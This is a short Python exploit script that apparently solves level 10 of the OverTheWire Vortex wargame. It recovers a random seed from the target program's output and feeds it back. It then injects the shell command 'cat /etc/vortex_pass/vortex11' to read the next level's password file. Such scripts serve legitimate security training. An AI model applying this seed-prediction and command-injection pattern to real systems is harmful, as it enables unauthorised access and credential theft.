#!/usr/bin/python3
import subprocess

program = "./level10"
vortex_program = "/vortex/vortex10"

process = subprocess.Popen(vortex_program, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

numbers = process.stdout.readline() 
print("numbers = " + str(numbers) + '\n')

result = subprocess.run(
    [program, numbers],
    capture_output=True
)

seed = result.stdout
print(f"seed = {int.from_bytes(seed, 'little')}")

process.stdin.write(seed)
process.stdin.flush() # send EOF to stdin

command = '''
    cat /etc/vortex_pass/vortex11
    '''
process.stdin.write(command.encode())
process.stdin.close() # send EOF to stdin, and close it

print("password is:", process.stdout.read().decode())

process.kill()
